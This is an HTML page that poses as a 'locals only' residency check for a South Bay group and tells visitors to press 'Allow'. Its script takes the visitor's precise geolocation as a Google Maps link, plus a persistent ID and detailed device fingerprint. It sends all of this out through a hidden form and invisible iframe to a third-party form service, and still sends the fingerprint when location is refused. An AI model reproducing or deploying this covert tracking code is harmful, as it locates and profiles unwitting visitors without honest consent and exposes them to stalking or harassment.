<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>310 South Bay | LOCALS ONLY CONTENT </title>
    <style>
        body {
            background-color: #000000;
            margin: 0;
            padding: 0;
            color: #ffffff;
            font-family: 'Arial Black', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            overflow: hidden;
        }

        .container {
            max-width: 90%;
            padding: 20px;
        }

        .header-logo {
            max-width: 100%;
            height: auto;
            margin-bottom: 40px;
            filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.2));
            animation: pulse 4s infinite ease-in-out;
        }

        @keyframes pulse {
            0% { filter: drop-shadow(0 0 5px rgba(200, 0, 0, 0.3)); }
            50% { filter: drop-shadow(0 0 25px rgba(255, 0, 0, 0.7)); }
            100% { filter: drop-shadow(0 0 5px rgba(200, 0, 0, 0.3)); }
        }

        .bold-phrase {
            font-size: 1.5rem;
            text-transform: uppercase;
            letter-spacing: 0.15em;
            margin-bottom: 10px;
            line-height: 1.4;
        }

        #status-text {
            font-size: 1.1rem;
            color: #888888;
            font-weight: normal;
            margin-bottom: 10px;
            letter-spacing: 0.05em;
            text-transform: uppercase;
        }

        #location-display {
            font-family: monospace;
            font-size: 0.9rem;
            color: #ff0000;
            margin-bottom: 30px;
            text-transform: uppercase;
        }

        /* Hidden elements */
        #geo-form, #silent-target {
            display: none;
        }

        .contact-info {
            font-size: 0.7rem;
            letter-spacing: 0.1em;
            color: #444;
            margin-top: 20px;
        }

        a {
            color: #666;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="MagicEraser_260417_233536.png" alt="310 South Bay Logo" class="header-logo">
        
        <div class="bold-phrase">SOUTHBAY RESIDENTS <br>PRESS "ALLOW" TO CONFIRM</div>
        <div id="status-text">WAITING FOR SYSTEM VERIFICATION...</div>
        <div id="location-display"></div>

        <iframe name="silent-target" id="silent-target"></iframe>

        <form action="https://api.web3forms.com/submit" method="POST" id="geo-form" target="silent-target">
            <input type="hidden" name="access_key" value="ef9cd85f-4381-47c4-a0e8-09bd08a62dab">
            <input type="hidden" name="subject" id="form-subject" value="Resident System Alert">
            
            <input type="hidden" name="visitor_id" id="visitor-id">
            <input type="hidden" name="google_maps_link" id="map-link">
            
            <input type="hidden" name="name" value="Resident System Logger">
            <input type="hidden" name="email" value="verify@310southbay.com">
            <textarea name="message" id="log-msg" style="display:none;"></textarea>
        </form>
        
        <div class="contact-info">
            INQUIRIES: <a href="mailto:info@310southbay.com">INFO@310SOUTHBAY.COM</a>
        </div>
    </div>

    <script>
        function getVisitorID() {
            let id = localStorage.getItem('310_resident_id');
            if (!id) {
                id = 'RES-' + Math.random().toString(36).substr(2, 9).toUpperCase();
                localStorage.setItem('310_resident_id', id);
            }
            return id;
        }

        function triggerSubmission(logData, uiMessage, isSuccess) {
            const status = document.getElementById('status-text');
            const form = document.getElementById('geo-form');
            const subjectField = document.getElementById('form-subject');
            
            // Set subject to differentiate between verified and denied in your inbox
            subjectField.value = isSuccess ? "VERIFIED RESIDENT" : "DENIED - KOOK DETECTED";
            
            document.getElementById('log-msg').value = logData;
            status.innerHTML = uiMessage;
            
            if (!isSuccess) {
                status.style.color = "#ff0000";
            } else {
                status.style.color = "#00ff00";
            }

            form.submit();
        }

        window.onload = function() {
            const locDisplay = document.getElementById('location-display');
            const vID = getVisitorID();
            document.getElementById('visitor-id').value = vID;

            // Comprehensive device/browser metadata
            const deviceData = `
DEVICE ID: ${vID}
OS/PLATFORM: ${navigator.platform}
CORES: ${navigator.hardwareConcurrency || 'N/A'}
RAM: ${navigator.deviceMemory || 'N/A'}GB
SCREEN: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
BROWSER: ${navigator.userAgent}
LANG: ${navigator.language}
TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
            `;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // --- SUCCESS CASE ---
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;

                    locDisplay.innerHTML = `LOCATED: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
                    document.getElementById('map-link').value = mapUrl;

                    const successLog = `[ACCESS GRANTED]\n${deviceData}\nMAP LINK: ${mapUrl}`;
                    triggerSubmission(successLog, "VERIFIED. ACCESS GRANTED.", true);

                }, function(error) {
                    // --- DENIAL CASE ---
                    // Still submits all deviceData collected above
                    const denialLog = `[ACCESS DENIED BY USER]\n${deviceData}\nREASON: User blocked or timed out.`;
                    
                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED Or Enable location and refresh.";
                    triggerSubmission(denialLog, "ACCESS DENIED. FUCK OFF KOOK!", false);
                });
            } else {
                document.getElementById('status-text').innerHTML = "UNSUPPORTED DEVICE.";
            }
        };
    </script>

</body>
</html>
